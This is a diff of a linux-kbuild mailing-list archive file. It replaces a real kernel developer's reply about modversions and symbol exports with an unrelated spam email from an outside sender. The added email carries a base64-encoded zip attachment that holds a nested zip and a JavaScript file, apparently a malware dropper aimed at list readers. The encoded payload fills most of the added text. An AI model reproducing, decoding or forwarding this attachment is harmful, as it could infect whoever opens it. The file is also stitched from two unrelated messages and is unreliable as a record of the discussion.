@@ -1,72 +1,61 @@
 Return-Path: <linux-kbuild-owner@vger.kernel.org>
-Received: from mx2.suse.de ([195.135.220.15]:43307 "EHLO mx2.suse.de"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S935138AbcKXKvd (ORCPT <rfc822;linux-kbuild@vger.kernel.org>);
-        Thu, 24 Nov 2016 05:51:33 -0500
-Subject: Re: [PATCH] x86/kbuild: enable modversions for symbols exported from
- asm
-References: <20161123205338.GA12050@angband.pl>
- <20161123210256.31501-1-kilobyte@angband.pl>
- <20161124044028.GA12704@gmail.com>
- <20161124162051.5e336127@roar.ozlabs.ibm.com>
- <20161124060050.GA788@gmail.com>
- <20161124182026.34e6570b@roar.ozlabs.ibm.com>
- <20161124073639.GA12728@kroah.com>
- <20161124185322.1e2a492c@roar.ozlabs.ibm.com>
- <250b3310-6e4a-1352-be7a-a5a472829cec@suse.com>
- <20161124210355.4875c61a@roar.ozlabs.ibm.com>
-From: Michal Marek <mmarek@suse.com>
-Message-ID: <46e6def3-5724-90be-1844-d91b32bd2bcb@suse.com>
-Date: Thu, 24 Nov 2016 11:51:23 +0100
+Received: from static.vnpt.vn ([14.160.52.118]:40654 "HELO vnpt.vn"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S935112AbcKXMw4 (ORCPT <rfc822;linux-kbuild@vger.kernel.org>);
+        Thu, 24 Nov 2016 07:52:56 -0500
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment
+From: <mpinon@uach.mx>
 MIME-Version: 1.0
-In-Reply-To: <20161124210355.4875c61a@roar.ozlabs.ibm.com>
-Content-Type: text/plain; charset=windows-1252
-Content-Transfer-Encoding: 7bit
+Content-Type: application/zip; name="INFO_18766484503592_linux-kbuild.zip"
+Message-ID: <147999197033.12681.725958835422615962@vnpt.vn>
+Subject: 7630 linux-kbuild
+Date: Thu, 24 Nov 2016 12:52:50 -0000
 Sender: linux-kbuild-owner@vger.kernel.org
 List-ID: <linux-kbuild.vger.kernel.org>
-To: Nicholas Piggin <npiggin@gmail.com>
-Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>, Ingo Molnar <mingo@kernel.org>, Al Viro <viro@zeniv.linux.org.uk>, Adam Borowski <kilobyte@angband.pl>, Philip Muller <philm@manjaro.org>, linux-kernel@vger.kernel.org, Thomas Gleixner <tglx@linutronix.de>, Ingo Molnar <mingo@redhat.com>, "H. Peter Anvin" <hpa@zytor.com>, Linus Torvalds <torvalds@linux-foundation.org>, Andrew Morton <akpm@linux-foundation.org>, Peter Zijlstra <a.p.zijlstra@chello.nl>, linux-arch <linux-arch@vger.kernel.org>, linux-kbuild <linux-kbuild@vger.kernel.org>
+To: linux-kbuild@vger.kernel.org
 
-Dne 24.11.2016 v 11:03 Nicholas Piggin napsal(a):
-> On Thu, 24 Nov 2016 10:32:12 +0100
-> Michal Marek <mmarek@suse.com> wrote:
-> 
->> On 2016-11-24 08:53, Nicholas Piggin wrote:
->>> On Thu, 24 Nov 2016 08:36:39 +0100
->>> Greg Kroah-Hartman <gregkh@linuxfoundation.org> wrote:
->>>   
->>>> On Thu, Nov 24, 2016 at 06:20:26PM +1100, Nicholas Piggin wrote:  
->>>>> But still, modversions is pretty complicated for what it gives us. It sends
->>>>> preprocessed C into a C parser that makes CRCs using type definitions of
->>>>> exported symbols, then turns those CRCs into a linker script which which is
->>>>> used to link the .o file with. What we get in return is a quite limited and
->>>>> symbol "versioning" system.
->>>>>
->>>>> What if we ripped all that out and just attached an explicit version to
->>>>> each export, and incompatible changes require an increment?    
->>>>
->>>> How would that work for structures?  Would that be required for every
->>>> EXPORT_SYMBOL* somehow?  
->>>
->>> Yeah just have EXPORT_SYMBOL take another parameter which attaches a version
->>> number and use that as the value for the __crc_ symbol versions rather than
->>> a calculated CRC.  
->>
->> The problem is that with every kernel release, the structures change in
->> a way that you would have to bump the version of virtually every export.
->>
->> At which point, there would be little difference between
->> CONFIG_MODVERSION on and off (without CONFIG_MODVERSION, we compare the
->> kernel version strings when loading modules).
-> 
-> 
-> I'm not sure about that. If they are truly incompatible changes and
-> MODVERSIONS does not pick up a different CRC, then it's even worse if
-> incompatible modules are missed so often.
-
-Now I'm confused: Are you suggesting to do this manual symbol versioning
-for all exports, or only those defined in asm?
-
-Thanks,
-Michal
-
+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
